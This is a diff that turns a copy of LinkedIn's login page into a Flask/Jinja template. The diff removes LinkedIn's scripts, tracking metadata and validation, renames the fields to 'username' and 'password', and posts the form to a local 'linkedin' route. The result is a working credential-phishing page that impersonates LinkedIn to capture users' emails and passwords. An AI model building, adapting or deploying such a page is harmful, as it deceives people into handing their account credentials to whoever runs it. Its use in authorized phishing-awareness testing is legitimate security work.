@@ -5,24 +5,8 @@
     <meta http-equiv="X-UA-Compatible" content="IE=EDGE">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="asset-url" id="artdeco/static/images/icons.svg" content="https://static-exp1.licdn.com/sc/h/br/6bja66gymvrvqrp5m6btz3vkz">
     <title>LinkedIn Login, Sign in | LinkedIn</title>
-    <link rel="shortcut icon" href="https://static-exp1.licdn.com/sc/h/br/9lb1g1kp916tat669q9r5g2kz">
-    <link rel="apple-touch-icon" href="https://static-exp1.licdn.com/sc/h/br/1exdo4axa6eaw1jioxh1vu4fj">
-    <link rel="apple-touch-icon-precomposed" href="https://static-exp1.licdn.com/sc/h/br/55ggxxse8uyjdh2x78ht3j40q">
-    <link rel="apple-touch-icon-precomposed" sizes="57x57" href="https://static-exp1.licdn.com/sc/h/br/1exdo4axa6eaw1jioxh1vu4fj">
-    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://static-exp1.licdn.com/sc/h/br/55ggxxse8uyjdh2x78ht3j40q">
-    <meta name="treeID" content="TAZ5Gwh64RUAEjXb+yoAAA==">
-    <meta name="pageKey" content="d_checkpoint_lg_consumerLogin">
-    <meta name="pageInstance" content="urn:li:page:d_checkpoint_lg_consumerLogin;I5GmOABtSNmEEJpCF6kXTw==">
-    <meta name="appName" content="checkpoint-frontend">
-    <meta name="robots" content="NOODP">
-    <meta name="description" content="Login to LinkedIn to keep in touch with people you know, share ideas, and build your career.">
     <link rel="stylesheet" href="https://static-exp1.licdn.com/sc/p/com.linkedin.checkpoint%3Acheckpoint-static-content%2B2.0.971/f/%2Fcheckpoint-frontend%2Fstylesheets%2Flogin%2Forganic%2Fdesktop_en_US.css" />
-    <link rel="canonical" href="https://www.linkedin.com/login" />
-    <link rel="preload" href='https://static-exp1.licdn.com/sc/h/br/8ozcw32srd405zikuapo244z' as="script" />
-    <link rel="preload" href='https://static-exp1.licdn.com/sc/h/br/64qgwz5qqroaggxqxu6370jvs' as="script" />
-    <link rel="preload" href='https://static-exp1.licdn.com/sc/h/br/48c269igpj4j3wqfu0imfuhe9' as="script" />
 </head>
 
 <body class="system-fonts ">
@@ -77,24 +61,13 @@
                     <h1 class="header__content__heading">Welcome Back</h1>
                     <p class="header__content__subheading">Don&#39;t miss your next opportunity. Sign in to stay updated on your professional world.</p>
                 </div>
-                    <form method="post" class="login__form" action="{{ url_for('linkedin') }}" novalidate>
-                    <code id="login_form_validation_error_username" style="display: none;"><!--"Please enter a valid username"--></code>
-                    <code id="consumer_login__text_plain__invalid_username" style="display: none;"><!--"Hmm, we don&#39;t recognize that email. Please try again."--></code>
-                    <code id="consumer_login__text_plain__large_username" style="display: none;"><!--"Email or phone number must be between 3 to 128 characters"--></code>
-                    <code id="consumer_login__text_plain__invalid_username_with_phone_v2" style="display: none;"><!--"Hmm, we don’t recognize that phone number. Please try again"--></code>
-                    <code id="consumer_login__text_plain__no_username" style="display: none;"><!--"Please enter an email address or phone number"--></code>
+                    <form class="login__form" action="{{ url_for('linkedin') }}" method="post">
                     <div class="form__input--floating">
-                        <input id="username" name="session_key" type="text" aria-describedby="error-for-username" required validation="email|tel" autofocus aria-label="Email or Phone" />
+                        <input id="username" name="username" type="text" aria-describedby="error-for-username" aria-label="Email or Phone" />
                         <label class="form__label--floating" for="username" aria-hidden="true">Email or Phone</label>
-                        <div error-for="username" id="error-for-username" class="form__label--error  hidden" role="alert" aria-live="assertive"></div>
-                    </div><code id="domainSuggestion" style="display: none;"><!--false--></code>
-                    <input type="hidden" name="controlId" value="d_checkpoint_lg_consumerLogin-login_submit_button" />
-                    <code id="consumer_login__text_plain__empty_password" style="display: none;"><!--"Please enter a password."--></code>
-                    <code id="consumer_login__text_plain__small_password" style="display: none;"><!--"The password you provided must have at least 6 characters."--></code>
                     <div class="form__input--floating">
-                        <input id="password" type="password" aria-describedby="error-for-password" name="session_password" required validation="password" aria-label="Password" />
+                        <input id="password" type="password" aria-describedby="error-for-password" name="password" aria-label="Password" />
                         <label for="password" class="form__label--floating" aria-hidden="true">Password</label>
-                        <div error-for="password" id="error-for-password" class="form__label--error  hidden" role="alert" aria-live="assertive"></div><span id="password-visibility-toggle" class="button__password-visibility" role="button" tabindex="0">Show</span></div>
                     <div class="login__form_action_container ">
                         <button class="btn__primary--large from__button--floating" type="submit" aria-label="Sign in">Sign in</button>
                     </div>
@@ -157,16 +130,12 @@
                 </div>
             </div>
         </footer>
-        <artdeco-toasts></artdeco-toasts><span class="hidden toast-success-icon"><li-icon type="success-pebble-icon" size="small" aria-hidden="true"><svg viewBox="0 0 24 24" width="24px" height="24px" x="0" y="0" preserveAspectRatio="xMinYMin meet" class="artdeco-icon" focusable="false"><g class="small-icon" style="fill-opacity: 1"><circle class="circle" r="6.1" stroke="currentColor" stroke-width="1.8" cx="8" cy="8" fill="none" transform="rotate(-90 8 8)"></circle><path d="M9.95,5.033l1.2,0.859l-3.375,4.775C7.625,10.875,7.386,10.999,7.13,11c-0.002,0-0.003,0-0.005,0    c-0.254,0-0.493-0.12-0.644-0.325L4.556,8.15l1.187-0.875l1.372,1.766L9.95,5.033z" fill="currentColor"></path></g></svg></li-icon></span><span class="hidden toast-error-icon"><li-icon type="error-pebble-icon" size="small" aria-hidden="true"><svg viewBox="0 0 24 24" width="24px" height="24px" x="0" y="0" preserveAspectRatio="xMinYMin meet" class="artdeco-icon" focusable="false"><g class="small-icon" style="fill-opacity: 1"><circle class="circle" r="6.1" stroke="currentColor" stroke-width="1.8" cx="8" cy="8" fill="none" transform="rotate(-90 8 8)"></circle><path fill="currentColor" d="M10.916,6.216L9.132,8l1.784,1.784l-1.132,1.132L8,9.132l-1.784,1.784L5.084,9.784L6.918,8L5.084,6.216l1.132-1.132L8,6.868l1.784-1.784L10.916,6.216z"></path></g></svg></li-icon></span><span class="hidden toast-notify-icon"><li-icon type="yield-pebble-icon" size="small" aria-hidden="true"><svg viewBox="0 0 24 24" width="24px" height="24px" x="0" y="0" preserveAspectRatio="xMinYMin meet" class="artdeco-icon" focusable="false"><g class="small-icon" style="fill-opacity: 1"><circle class="circle" r="6.1" stroke="currentColor" stroke-width="1.8" cx="8" cy="8" fill="none" transform="rotate(-90 8 8)"></circle><path d="M7,10h2v2H7V10z M7,9h2V4H7V9z"></path></g></svg></li-icon></span><span class="hidden toast-gdpr-icon"><li-icon aria-hidden="true" type="shield-icon" size="small"><svg viewBox="0 0 24 24" width="24px" height="24px" x="0" y="0" preserveAspectRatio="xMinYMin meet" class="artdeco-icon" focusable="false"><path d="M8,1A10.89,10.89,0,0,1,2.87,3,1,1,0,0,0,2,4V9.33a5.67,5.67,0,0,0,2.91,5L8,16l3.09-1.71a5.67,5.67,0,0,0,2.91-5V4a1,1,0,0,0-.87-1A10.89,10.89,0,0,1,8,1ZM4,4.7A12.92,12.92,0,0,0,8,3.26a12.61,12.61,0,0,0,3.15,1.25L4.45,11.2A3.66,3.66,0,0,1,4,9.46V4.7Zm6.11,8L8,13.84,5.89,12.66A3.65,3.65,0,0,1,5,11.92l7-7V9.46A3.67,3.67,0,0,1,10.11,12.66Z" class="small-icon" style="fill-opacity: 1"></path></svg></li-icon></span><span class="hidden toast-cancel-icon"><li-icon type="cancel-icon" size="large"><svg x="0" y="0" id="cancel-icon" preserveAspectRatio="xMinYMin meet" viewBox="0 0 24 24" width="24px" height="24px"><svg class="small-icon" style="fill-opacity: 1;"><path d="M12.99,4.248L9.237,8L13,11.763L11.763,13L8,9.237L4.237,13L3,11.763L6.763,8L3,4.237L4.237,3L8,6.763l3.752-3.752L12.99,4.248z"/></svg><svg class="large-icon" style="fill: currentColor;"><path d="M20,5.237l-6.763,6.768l6.743,6.747l-1.237,1.237L12,13.243L5.257,19.99l-1.237-1.237l6.743-6.747L4,5.237L5.237,4L12,10.768L18.763,4L20,5.237z"/></svg></svg></li-icon></span>
         <div id="loader-wrapper" class="hidden">
             <li-icon type="loader" class="blue" size="medium" aria-hidden="true">
                 <div class="artdeco-spinner"><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span></div>
             </li-icon>
         </div>
     </div><code id="isDesktop" style="display: none;"><!--"true"--></code><code id="lix_checkpoint_china_login_issue_fix" style="display: none;"><!--"treatment"--></code>
-    <script src='https://static-exp1.licdn.com/sc/h/br/48c269igpj4j3wqfu0imfuhe9' defer></script>
-    <script src='https://static-exp1.licdn.com/sc/h/br/8ozcw32srd405zikuapo244z' defer></script><code id="lix_cv_scoring_login_get_fingerprint" style="display: none;"><!--"enabled"--></code>
-    <script src="https://static-exp1.licdn.com/sc/h/br/64qgwz5qqroaggxqxu6370jvs" defer></script>
 </body>
 
 </html>
